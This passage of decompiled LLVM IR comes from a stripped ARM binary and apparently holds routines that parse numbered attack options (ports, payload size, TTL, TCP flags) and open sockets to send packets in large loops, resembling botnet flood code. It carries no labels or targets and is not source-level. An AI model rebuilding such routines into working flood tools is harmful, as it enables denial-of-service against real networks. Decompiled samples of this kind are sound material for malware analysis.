  %v1_9418.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9414

dec_label_pc_9570:                                ; preds = %dec_label_pc_9558, %dec_label_pc_9404
  %v0_9570 = call i32 @function_e0b4()
  %v3_9578 = urem i32 %v0_9570, 65536
  store i32 %v3_919c, i32* %r2.global-to-local, align 4
  %v1_9584 = sub nsw i32 999, %v3_9578
  store i32 %v1_9584, i32* %r3.global-to-local, align 4
  %v1_9588 = load i32, i32* %r4.global-to-local, align 4
  %v9_9588 = icmp eq i32 %v3_919c, %v1_9588
  store i1 %v9_9588, i1* %cpsr_z.global-to-local, align 1
  %v1_958c = trunc i32 %v0_9570 to i16
  %v2_958c = load i32, i32* @r5, align 4
  %v3_958c = add i32 %v2_958c, 4
  %v4_958c = inttoptr i32 %v3_958c to i16*
  store i16 %v1_958c, i16* %v4_958c, align 2
  %v0_9590 = load i32, i32* %r3.global-to-local, align 4
  %v1_9590 = trunc i32 %v0_9590 to i16
  %v2_9590 = load i32, i32* @r6, align 4
  %v3_9590 = add i32 %v2_9590, 4
  %v4_9590 = inttoptr i32 %v3_9590 to i16*
  store i16 %v1_9590, i16* %v4_9590, align 2
  br i1 %v9_9588, label %dec_label_pc_9598, label %dec_label_pc_9570.dec_label_pc_9420_crit_edge

dec_label_pc_9570.dec_label_pc_9420_crit_edge:    ; preds = %dec_label_pc_9570
  %v1_9424.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9420

dec_label_pc_9598:                                ; preds = %dec_label_pc_9570, %dec_label_pc_9414
  %v0_9598 = call i32 @function_e0b4()
  %v1_9598 = trunc i32 %v0_9598 to i16
  store i32 %v3_91a0, i32* %r3.global-to-local, align 4
  %v1_95a0 = load i32, i32* %r4.global-to-local, align 4
  %v9_95a0 = icmp eq i32 %v3_91a0, %v1_95a0
  store i1 %v9_95a0, i1* %cpsr_z.global-to-local, align 1
  %v3_95a4 = load i32, i32* @r5, align 4
  %v4_95a4 = add i32 %v3_95a4, 44
  %v5_95a4 = inttoptr i32 %v4_95a4 to i16*
  store i16 %v1_9598, i16* %v5_95a4, align 2
  br i1 %v9_95a0, label %dec_label_pc_95ac, label %dec_label_pc_942c

dec_label_pc_95ac:                                ; preds = %dec_label_pc_9598, %dec_label_pc_9420
  %v0_95ac = call i32 @function_e0b4()
  %v1_95ac = trunc i32 %v0_95ac to i16
  store i32 %v1_9194, i32* @r4, align 4
  store i1 %v2_95b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95b4, label %.thread30, label %bb85

.thread30:                                        ; preds = %dec_label_pc_95ac
  %v3_95bc31 = load i32, i32* @r7, align 4
  %v4_95bc32 = add i32 %v3_95bc31, 2
  %v5_95bc33 = inttoptr i32 %v4_95bc32 to i16*
  store i16 %v1_95ac, i16* %v5_95bc33, align 2
  br label %dec_label_pc_95c8

bb85:                                             ; preds = %dec_label_pc_95ac
  %v1_95b8 = load i32, i32* @r5, align 4
  %v2_95b8 = add i32 %v1_95b8, 16
  %v3_95b8 = inttoptr i32 %v2_95b8 to i32*
  %v4_95b8 = load i32, i32* %v3_95b8, align 4
  store i32 %v4_95b8, i32* %r3.global-to-local, align 4
  %v3_95bc = load i32, i32* @r7, align 4
  %v4_95bc = add i32 %v3_95bc, 2
  %v5_95bc = inttoptr i32 %v4_95bc to i16*
  store i16 %v1_95ac, i16* %v5_95bc, align 2
  %v1_95c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_95c0 = load i32, i32* @r6, align 4
  %v3_95c0 = add i32 %v2_95c0, 16
  %v4_95c0 = inttoptr i32 %v3_95c0 to i32*
  store i32 %v1_95c0, i32* %v4_95c0, align 4
  br label %dec_label_pc_9440

dec_label_pc_95c8:                                ; preds = %.thread30, %dec_label_pc_942c
  %v0_95c8 = call i32 @function_e0b4()
  store i32 %v1_9108, i32* %r1.global-to-local, align 4
  store i1 %v2_95d0, i1* %cpsr_z.global-to-local, align 1
  %v1_95d4 = load i32, i32* @r6, align 4
  %v2_95d4 = add i32 %v1_95d4, 16
  %v3_95d4 = inttoptr i32 %v2_95d4 to i32*
  store i32 %v0_95c8, i32* %v3_95d4, align 4
  br i1 %v2_95d0, label %dec_label_pc_944c, label %dec_label_pc_95dc

dec_label_pc_95dc:                                ; preds = %dec_label_pc_9440, %dec_label_pc_95c8
  %v0_95dc = load i32, i32* @r7, align 4
  %v1_95dc = add i32 %v0_95dc, 8
  store i32 %v6_90e8, i32* %r1.global-to-local, align 4
  %v2_95e4 = inttoptr i32 %v1_95dc to i16*
  %v3_95e4 = call i32 @function_e248(i16* %v2_95e4, i32 %v6_90e8)
  br label %dec_label_pc_944c

dec_label_pc_95ec:                                ; preds = %dec_label_pc_9160
  %v1_95f0 = call i32 @function_10dd8(i32 %v3_9150)
  br label %dec_label_pc_95f4

dec_label_pc_95f4:                                ; preds = %dec_label_pc_9000, %dec_label_pc_95ec
  %v1_95fc = phi i32 [ %v3_9150, %dec_label_pc_9000 ], [ %v1_95f0, %dec_label_pc_95ec ]
  store i32 %v3_9000, i32* %r4.global-to-local, align 4
  store i32 %v6_9000, i32* %r5.global-to-local, align 4
  store i32 %v24_9000, i32* %fp.global-to-local, align 4
  ret i32 %v1_95fc

dec_label_pc_9600:                                ; preds = %dec_label_pc_9188
  store i32 %v6_90e8, i32* %r2.global-to-local, align 4
  %v1_9608 = add i32 %v6_90e8, 8
  store i32 %v1_9608, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_93bc.preheader

; uselistorder directives
  uselistorder i32 %v1_9608, { 1, 0 }
  uselistorder i16 %v1_95ac, { 1, 0 }
  uselistorder i32 %v0_9570, { 1, 0 }
  uselistorder i32 %v5_9548, { 1, 0 }
  uselistorder i32 %v0_950c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_94e8, { 1, 2, 0 }
  uselistorder i32 %v1_94e4, { 2, 0, 3, 1 }
  uselistorder i32 %v3_9498, { 1, 0, 2 }
  uselistorder i32 %v0_9480, { 1, 0, 2, 3 }
  uselistorder i32 %v7_93e4, { 1, 0, 2 }
  uselistorder i1 %v7_93fc, { 2, 1, 0 }
  uselistorder i1 %v2_95d0, { 2, 3, 1, 0 }
  uselistorder i1 %v2_95b4, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9358, { 1, 0 }
  uselistorder i32 %v4_92cc13, { 1, 0 }
  uselistorder i32 %v3_91f0, { 1, 0 }
  uselistorder i32 %v3_91d4, { 1, 2, 0 }
  uselistorder i32 %v1_91d0, { 1, 0 }
  uselistorder i32 %v1_9194, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_9190, { 1, 0, 3, 2 }
  uselistorder i32 %v0_918c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_9188, { 1, 0, 2, 3 }
  uselistorder i1 %v7_9180, { 1, 0 }
  uselistorder i1 %v7_9154, { 1, 0 }
  uselistorder i32 %v3_9150, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v6_913c, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_9108, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_90e8, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v1_909c, { 1, 2, 0 }
  uselistorder i32 %v1_9078, { 3, 2, 1, 0 }
  uselistorder i32 %v6_9070, { 1, 0 }
  uselistorder i32 %v6_9034, { 2, 1, 3, 0 }
  uselistorder i32 %v2_901c, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 6, 5, 7, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 26, 25, 27, 28, 30, 29, 31, 32, 34, 33, 36, 35, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_95f4, { 1, 0 }
  uselistorder label %dec_label_pc_95dc, { 1, 0 }
  uselistorder label %dec_label_pc_944c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_93bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93bc.preheader, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
}

define i32 @function_961c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_961c:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_961c = load i32, i32* @r4, align 4
  %v18_961c = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_9638 = call i32 @function_1214c(i32 %arg1, i32 4)
  store i32 %v2_9638, i32* @sl, align 4
  %v0_9644 = load i32, i32* @r7, align 4
  %v2_9648 = call i32 @function_1214c(i32 %v0_9644, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_9654 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_9648, i32* @r8, align 4
  %v0_9664 = load i32, i32* @r5, align 4
  %v5_9668 = inttoptr i32 %v0_9654 to i32*
  %v6_9668 = call i32 @function_8570(i32 %v0_9664, i32* %v5_9668, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v3_9670 = urem i32 %v6_9668, 65536
  %v0_9674 = load i32, i32* @r6, align 4
  %v0_967c = load i32, i32* @r4, align 4
  store i32 %v0_967c, i32* %r3.global-to-local, align 4
  %v0_9680 = load i32, i32* @r5, align 4
  %v5_9688 = inttoptr i32 %v0_9674 to i32*
  %v6_9688 = call i32 @function_8570(i32 %v0_9680, i32* %v5_9688, i32 6, i32 %v0_967c, i32 %v3_9670)
  %v0_968c = load i32, i32* @r6, align 4
  %v3_9690 = mul i32 %v6_9688, 65536
  store i32 %v3_9690, i32* %sb.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v0_969c = load i32, i32* @r5, align 4
  %v5_96a0 = inttoptr i32 %v0_968c to i32*
  %v6_96a0 = call i32 @function_8570(i32 %v0_969c, i32* %v5_96a0, i32 0, i32 1024, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_96b0 = load i32, i32* @r6, align 4
  %v0_96b4 = load i32, i32* @r5, align 4
  %v3_96b8 = urem i32 %v6_96a0, 65536
  store i32 %v3_96b8, i32* @r5, align 4
  %v5_96bc = inttoptr i32 %v0_96b0 to i32*
  %v6_96bc = call i32 @function_8570(i32 %v0_96b4, i32* %v5_96bc, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v0_96c0 = load i32, i32* %sb.global-to-local, align 4
  %v3_96c0 = udiv i32 %v0_96c0, 65536
  store i32 %v3_96c0, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_96c8 = load i32, i32* @r4, align 4
  %v9_96c8 = icmp eq i32 %v3_96c0, %v1_96c8
  br i1 %v9_96c8, label %dec_label_pc_96f8, label %bb

bb:                                               ; preds = %dec_label_pc_961c
  store i32 0, i32* %stack_var_-56, align 4
  %v4_96e0 = udiv i32 %v0_96c0, 16777216
  store i32 %v4_96e0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9708

dec_label_pc_96f8:                                ; preds = %dec_label_pc_961c
  store i32 0, i32* %stack_var_-56, align 4
  %v0_96f8 = call i32 @function_e0b4()
  br label %dec_label_pc_9708

dec_label_pc_9708:                                ; preds = %bb, %dec_label_pc_96f8
  %v0_96ec10 = urem i32 %v6_96bc, 256
  %v0_9708 = load i32, i32* @r7, align 4
  %v2_9708 = icmp eq i32 %v0_9708, 0
  br i1 %v2_9708, label %dec_label_pc_9848, label %dec_label_pc_9710

dec_label_pc_9710:                                ; preds = %dec_label_pc_9708
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_97bc = udiv i32 %v3_9670, 256
  %v1_97b8 = mul i32 %v6_9668, 256
  %v4_97c0 = and i32 %v1_97b8, 65280
  %v5_97c0 = or i32 %v4_97c0, %v3_97bc
  %v2_9740 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_97a0

dec_label_pc_9720:                                ; preds = %bb51, %dec_label_pc_97e0
  %v3_972c = call i32 @function_115e4(i32 2, i32 2, i32 0)
  %v7_9734 = icmp eq i32 %v3_972c, -1
  %v0_9738 = load i32, i32* @sb, align 4
  %v1_9738 = add i32 %v0_9738, 1
  store i32 %v1_9738, i32* @sb, align 4
  %v0_973c = load i32, i32* @fp, align 4
  %v1_973c = add i32 %v0_973c, 24
  store i32 %v1_973c, i32* @fp, align 4
  %v2_9748 = load i32, i32* @r8, align 4
  %v3_9748 = add i32 %v2_9748, %stack_var_-60.0
  %v4_9748 = inttoptr i32 %v3_9748 to i32*
  store i32 %v3_972c, i32* %v4_9748, align 4
  br i1 %v7_9734, label %dec_label_pc_983c, label %dec_label_pc_9750

dec_label_pc_9750:                                ; preds = %dec_label_pc_9720
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_9768 = call i32 @function_11394(i32 %v3_972c, i32 %v2_9740, i32 16)
  %v0_976c = load i32, i32* @r6, align 4
  %v1_976c = add i32 %v0_976c, 20
  %v2_976c = inttoptr i32 %v1_976c to i8*
  %v3_976c = load i8, i8* %v2_976c, align 1
  %v4_976c = zext i8 %v3_976c to i32
  store i32 %v4_976c, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_976c, 32
  br i1 %tmp, label %dec_label_pc_97f4, label %dec_label_pc_9778

dec_label_pc_9778:                                ; preds = %dec_label_pc_9750, %dec_label_pc_97f4
  %v0_977c = phi i32 [ %v0_976c, %dec_label_pc_9750 ], [ %v0_977c.pre, %dec_label_pc_97f4 ]
  %v1_9780 = load i32, i32* @r8, align 4
  %v2_9780 = add i32 %v1_9780, %stack_var_-60.0
  %v3_9780 = inttoptr i32 %v2_9780 to i32*
  %v4_9780 = load i32, i32* %v3_9780, align 4
  %v3_9788 = call i32 @function_113cc(i32 %v4_9780, i32 %v0_977c, i32 16)
  %v0_9790 = load i32, i32* @sb, align 4
  %v1_9790 = load i32, i32* @r7, align 4
  %v9_9790 = icmp eq i32 %v0_9790, %v1_9790
  %v1_9794 = add i32 %stack_var_-60.0, 4
  store i32 %v1_9794, i32* %r3.global-to-local, align 4
  br i1 %v9_9790, label %dec_label_pc_9848, label %dec_label_pc_97a0

dec_label_pc_97a0:                                ; preds = %dec_label_pc_9778, %dec_label_pc_9710
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_9710 ], [ %v1_9794, %dec_label_pc_9778 ]
  store i32 65535, i32* @r4, align 4
  %v2_97b0 = call i32 @function_1214c(i32 65535, i32 1)
  store i32 %v5_97c0, i32* %r3.global-to-local, align 4
  %v1_97cc = load i32, i32* @r4, align 4
  %v9_97cc = icmp eq i32 %v3_9670, %v1_97cc
  %v1_97d0 = load i32, i32* @fp, align 4
  %v2_97d0 = add i32 %v1_97d0, %arg2
  store i32 %v2_97d0, i32* @r6, align 4
  %v2_97d4 = load i32, i32* @sl, align 4
  %v3_97d4 = add i32 %v2_97d4, %stack_var_-60.0
  %v4_97d4 = inttoptr i32 %v3_97d4 to i32*
  store i32 %v2_97b0, i32* %v4_97d4, align 4
  br i1 %v9_97cc, label %dec_label_pc_97e0, label %bb51

bb51:                                             ; preds = %dec_label_pc_97a0
  %v1_97d8 = load i32, i32* %r3.global-to-local, align 4
  %v2_97d8 = trunc i32 %v1_97d8 to i16
  %v3_97d8 = load i32, i32* @r6, align 4
  %v4_97d8 = add i32 %v3_97d8, 2
  %v5_97d8 = inttoptr i32 %v4_97d8 to i16*
  store i16 %v2_97d8, i16* %v5_97d8, align 2
  br label %dec_label_pc_9720

dec_label_pc_97e0:                                ; preds = %dec_label_pc_97a0
  %v0_97e0 = call i32 @function_e0b4()
  %v1_97e0 = trunc i32 %v0_97e0 to i16
  %v0_97e8 = load i32, i32* @fp, align 4
  %v2_97e8 = add i32 %v0_97e8, %arg2
  store i32 %v2_97e8, i32* @r6, align 4
  %v4_97ec = add i32 %v2_97e8, 2
  %v5_97ec = inttoptr i32 %v4_97ec to i16*
  store i16 %v1_97e0, i16* %v5_97ec, align 2
  br label %dec_label_pc_9720

dec_label_pc_97f4:                                ; preds = %dec_label_pc_9750
  %v1_97f4 = add i32 %v0_976c, 16
  %v2_97f4 = inttoptr i32 %v1_97f4 to i32*
  %v3_97f4 = load i32, i32* %v2_97f4, align 4
  store i32 %v3_97f4, i32* %r4.global-to-local, align 4
  %v0_97f8 = call i32 @function_e0b4()
  %v1_9808 = and i32 %v3_97f4, 65280
  store i32 %v1_9808, i32* %r3.global-to-local, align 4
  %v0_9810 = load i32, i32* @r6, align 4
  %v1_9810 = add i32 %v0_9810, 20
  %v2_9810 = inttoptr i32 %v1_9810 to i8*
  %v3_9810 = load i8, i8* %v2_9810, align 1
  %v4_9810 = zext i8 %v3_9810 to i32
  %v5_9814 = call i32 @llvm.bswap.i32(i32 %v3_97f4)
  %v7_9818 = lshr i32 %v0_97f8, %v4_9810
  %v8_9818 = add i32 %v7_9818, %v5_9814
  %v5_9830 = call i32 @llvm.bswap.i32(i32 %v8_9818)
  store i32 %v5_9830, i32* %r3.global-to-local, align 4
  %v2_9834 = add i32 %v0_9810, 4
  %v3_9834 = inttoptr i32 %v2_9834 to i32*
  store i32 %v5_9830, i32* %v3_9834, align 4
  %v0_977c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_9778

dec_label_pc_983c:                                ; preds = %dec_label_pc_9720
  store i32 %v3_961c, i32* %r4.global-to-local, align 4
  store i32 %v18_961c, i32* %sb.global-to-local, align 4
  ret i32 %v3_972c

dec_label_pc_9848:                                ; preds = %dec_label_pc_9778, %dec_label_pc_9708
  %v1_988822 = phi i32 [ 0, %dec_label_pc_9708 ], [ %v0_9790, %dec_label_pc_9778 ]
  %v2_984c = icmp eq i32 %v0_96ec10, 0
  br i1 %v2_984c, label %dec_label_pc_986c.outer, label %dec_label_pc_9884

dec_label_pc_985c:                                ; preds = %dec_label_pc_986c
  store i32 %v1_9860, i32* %r4.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_985c = load i32, i32* @r8, align 4
  %v4_985c = mul i32 %v1_9860, 4
  %v5_985c = add i32 %v0_985c, %v4_985c
  %v6_985c = inttoptr i32 %v5_985c to i32*
  %v7_985c = load i32, i32* %v6_985c, align 4
  %v0_9860 = load i32, i32* @sl, align 4
  %v5_9860 = add i32 %v0_9860, %v4_985c
  %v6_9860 = inttoptr i32 %v5_9860 to i32*
  %v7_9860 = load i32, i32* %v6_9860, align 4
  %v4_9864 = call i32 @function_11528(i32 %v7_985c, i32 %v7_9860, i32 %v0_9870, i32 16384)
  %v0_9868 = load i32, i32* %r4.global-to-local, align 4
  %v1_9868 = add i32 %v0_9868, 1
  %v0_986c.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_986c.outer

dec_label_pc_986c.outer:                          ; preds = %dec_label_pc_9848, %dec_label_pc_985c
  %v0_986c.ph = phi i32 [ %v0_986c.pre.pre, %dec_label_pc_985c ], [ %v1_988822, %dec_label_pc_9848 ]
  %v1_9860.ph = phi i32 [ %v1_9868, %dec_label_pc_985c ], [ 0, %dec_label_pc_9848 ]
  %v0_9870 = load i32, i32* @r5, align 4
  br label %dec_label_pc_986c

dec_label_pc_986c:                                ; preds = %dec_label_pc_986c.outer, %dec_label_pc_986c
  %v1_9860 = phi i32 [ 0, %dec_label_pc_986c ], [ %v1_9860.ph, %dec_label_pc_986c.outer ]
  %v8_9878 = icmp sgt i32 %v0_986c.ph, %v1_9860
  br i1 %v8_9878, label %dec_label_pc_985c, label %dec_label_pc_986c

dec_label_pc_9884:                                ; preds = %dec_label_pc_9888, %dec_label_pc_9848
  %v1_988821 = phi i32 [ %v1_988822, %dec_label_pc_9848 ], [ %v1_9888, %dec_label_pc_9888 ]
  br label %dec_label_pc_9888

dec_label_pc_9888:                                ; preds = %dec_label_pc_9894, %dec_label_pc_9884
  %v1_9888 = phi i32 [ %v1_988821, %dec_label_pc_9884 ], [ %v1_9888.pre, %dec_label_pc_9894 ]
  %v1_9894 = phi i32 [ 0, %dec_label_pc_9884 ], [ %v1_98b4, %dec_label_pc_9894 ]
  store i32 %v1_9894, i32* @r6, align 4
  %v6_9890 = icmp slt i32 %v1_9894, %v1_9888
  br i1 %v6_9890, label %dec_label_pc_9894, label %dec_label_pc_9884

dec_label_pc_9894:                                ; preds = %dec_label_pc_9888
  %v0_988c = load i32, i32* @r5, align 4
  %v0_9894 = load i32, i32* @sl, align 4
  %v4_9894 = mul i32 %v1_9894, 4
  %v5_9894 = add i32 %v0_9894, %v4_9894
  %v6_9894 = inttoptr i32 %v5_9894 to i32*
  %v7_9894 = load i32, i32* %v6_9894, align 4
  store i32 %v7_9894, i32* @r4, align 4
  %v2_989c = inttoptr i32 %v7_9894 to i16*
  %v3_989c = call i32 @function_e248(i16* %v2_989c, i32 %v0_988c)
  %v0_98a0 = load i32, i32* @r8, align 4
  %v1_98a0 = load i32, i32* @r6, align 4
  %v4_98a0 = mul i32 %v1_98a0, 4
  %v5_98a0 = add i32 %v4_98a0, %v0_98a0
  %v6_98a0 = inttoptr i32 %v5_98a0 to i32*
  %v7_98a0 = load i32, i32* %v6_98a0, align 4
  %v0_98a4 = load i32, i32* @r4, align 4
  %v0_98a8 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_98b0 = call i32 @function_11528(i32 %v7_98a0, i32 %v0_98a4, i32 %v0_98a8, i32 16384)
  %v0_98b4 = load i32, i32* @r6, align 4
  %v1_98b4 = add i32 %v0_98b4, 1
  %v1_9888.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_9888

; uselistorder directives
  uselistorder i32 %v1_9888, { 1, 0 }
  uselistorder i32 %v1_9860, { 2, 1, 0 }
  uselistorder i32 %v5_9830, { 1, 0 }
  uselistorder i32 %v3_97f4, { 1, 0, 2 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_976c, { 1, 0, 2 }
  uselistorder i32 %v3_972c, { 1, 3, 2, 0 }
  uselistorder i32 %v3_96c0, { 1, 0 }
  uselistorder i32 %v3_9670, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_986c, { 1, 0 }
  uselistorder label %dec_label_pc_986c.outer, { 1, 0 }
  uselistorder label %dec_label_pc_9778, { 1, 0 }
  uselistorder label %dec_label_pc_9720, { 1, 0 }
  uselistorder label %dec_label_pc_9708, { 1, 0 }
}

define i32 @function_98bc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_98bc:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_98bc = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_98d8 = call i32 @function_1214c(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_98e4 = load i32, i32* @r6, align 4
  store i32 %v0_98e4, i32* %r0.global-to-local, align 4
  %v2_98e8 = call i32 @function_1214c(i32 %v0_98e4, i32 4)
  %v0_98ec = load i32, i32* @r5, align 4
  store i32 %v0_98ec, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_98fc = load i32, i32* @r4, align 4
  store i32 %v0_98fc, i32* %r0.global-to-local, align 4
  %v5_9900 = inttoptr i32 %v0_98ec to i32*
  %v6_9900 = call i32 @function_8570(i32 %v0_98fc, i32* %v5_9900, i32 2, i32 0, i32 %v2_98e8)
  %v1_990c = urem i32 %v6_9900, 256
  store i32 %v1_990c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9918 = load i32, i32* @r5, align 4
  store i32 %v0_9918, i32* %r1.global-to-local, align 4
  %v0_991c = load i32, i32* @r4, align 4
  store i32 %v0_991c, i32* %r0.global-to-local, align 4
  %v5_9920 = trunc i32 %v6_9900 to i8
  %v6_9924 = inttoptr i32 %v0_9918 to i32*
  %v7_9924 = call i32 @function_8570(i32 %v0_991c, i32* %v6_9924, i32 3, i32 65535, i32 %v6_9900)
  %v0_9928 = load i32, i32* @r5, align 4
  store i32 %v0_9928, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9924, i32* @r7, align 4
  %v0_9938 = load i32, i32* @r4, align 4
  store i32 %v0_9938, i32* %r0.global-to-local, align 4
  %v5_993c = inttoptr i32 %v0_9928 to i32*
  %v6_993c = call i32 @function_8570(i32 %v0_9938, i32* %v5_993c, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_9944 = urem i32 %v6_993c, 256
  store i32 %v1_9944, i32* %ip.global-to-local, align 4
  %v0_9948 = load i32, i32* @r5, align 4
  store i32 %v0_9948, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9954 = load i32, i32* @r4, align 4
  store i32 %v0_9954, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_993c, 16777216
  %v5_995c = sdiv i32 %sext, 16777216
  %v6_995c = inttoptr i32 %v0_9948 to i32*
  %v7_995c = call i32 @function_8570(i32 %v0_9954, i32* %v6_995c, i32 5, i32 1, i32 %v5_995c)
  %v1_9968 = urem i32 %v7_995c, 256
  store i32 %v1_9968, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_9970 = load i32, i32* @r5, align 4
  store i32 %v0_9970, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_9978 = load i32, i32* @r4, align 4
  store i32 %v0_9978, i32* %r0.global-to-local, align 4
  %v5_9980 = inttoptr i32 %v0_9970 to i32*
  %v6_9980 = call i32 @function_8570(i32 %v0_9978, i32* %v5_9980, i32 7, i32 65535, i32 %v1_9968)
  %v0_9984 = load i32, i32* @r5, align 4
  store i32 %v0_9984, i32* %r1.global-to-local, align 4
  %v3_9988 = mul i32 %v6_9980, 65536
  store i32 %v3_9988, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9994 = load i32, i32* @r4, align 4
  store i32 %v0_9994, i32* %r0.global-to-local, align 4
  %v3_9998 = urem i32 %v6_9980, 65536
  store i32 %v3_9998, i32* @sl, align 4
  %v5_999c = inttoptr i32 %v0_9984 to i32*
  %v6_999c = call i32 @function_8570(i32 %v0_9994, i32* %v5_999c, i32 11, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_99a4 = urem i32 %v6_999c, 256
  store i32 %v1_99a4, i32* %ip.global-to-local, align 4
  %v0_99a8 = load i32, i32* @r5, align 4
  store i32 %v0_99a8, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
